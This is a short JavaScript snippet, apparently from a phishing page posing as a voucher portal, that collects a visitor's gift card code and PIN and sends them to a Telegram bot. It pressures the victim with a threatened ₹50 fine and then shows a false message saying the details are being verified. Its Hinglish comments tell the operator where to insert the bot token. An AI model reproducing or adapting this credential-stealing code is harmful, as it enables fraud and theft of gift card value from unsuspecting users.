<script>
function sendToTelegram() {
    const code = document.getElementById('gc_code').value;
    const pin = document.getElementById('gc_pin').value;

    if(code.length < 10 || pin.length < 4) {
        alert("Kripya sahi Code aur PIN dalein!");
        return;
    }

    const confirmFine = confirm("Kya aap sure hain? Galat voucher hone par ‚Çπ50 fine lagega. Aage badhein?");

    if (confirmFine) {
        // Aapka Telegram Logic
        const botToken = "YOUR_BOT_TOKEN"; // Yahan Token Dalein
        const chatId = "YOUR_CHAT_ID";     // Yahan Chat ID Dalein
        const message = `üöÄ FIXSCLUB DATA\n\nüí≥ GC Code: ${code}\nüîë PIN: ${pin}\nüåê Site: fixsclubprint.github.io`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(res => {
            alert("Details verify ho rahi hain! 30 minutes mein portal active ho jayega. Galat hone par fine lagega.");
            document.getElementById('gc_code').value = "";
            document.getElementById('gc_pin').value = "";
        })
        .catch(err => alert("Error! Kripya internet check karein."));
    }
}
</script>

